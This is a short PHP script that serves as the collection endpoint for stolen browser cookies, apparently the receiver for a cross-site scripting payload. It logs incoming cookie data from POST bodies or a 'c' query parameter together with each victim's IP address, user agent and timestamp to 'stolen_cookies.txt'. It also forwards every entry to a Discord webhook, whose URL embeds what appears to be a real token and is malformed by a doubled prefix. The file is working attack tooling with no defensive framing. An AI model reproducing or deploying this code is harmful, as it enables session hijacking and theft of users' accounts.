<?php
$logFile = 'stolen_cookies.txt';

$data = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $data = file_get_contents('php://input');
} elseif (isset($_GET['c'])) {
    $data = urldecode($_GET['c']);
}

if (!empty($data)) {
    $entry = $data . ' | IP: ' . $_SERVER['REMOTE_ADDR'] . ' | User-Agent: ' . $_SERVER['HTTP_USER_AGENT'] . ' | Time: ' . date('Y-m-d H:i:s') . "\n";
    file_put_contents($logFile, $entry, FILE_APPEND);
    
    // Optional Discord webhook forward
    $webhook_url = 'https://discord.com/api/webhooks/https://discord.com/api/webhooks/1467896250274812036/w7Or-fPilBf6BDd5AsWciOLcIjW2-mby-i-lf9gUS0X0ATXAVLY2uXIp2WClXk_3Wp1R';  // replace with your real webhook
    if ($webhook_url) {
        $payload = json_encode(['content' => 'New cookie: ```' . $entry . '```']);
        $ch = curl_init($webhook_url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
        curl_setopt($ch, CURLOPT_HTTPHEADER, ['Content-Type: application/json']);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_exec($ch);
        curl_close($ch);
    }
}

http_response_code(200);
echo 'ok';
?>
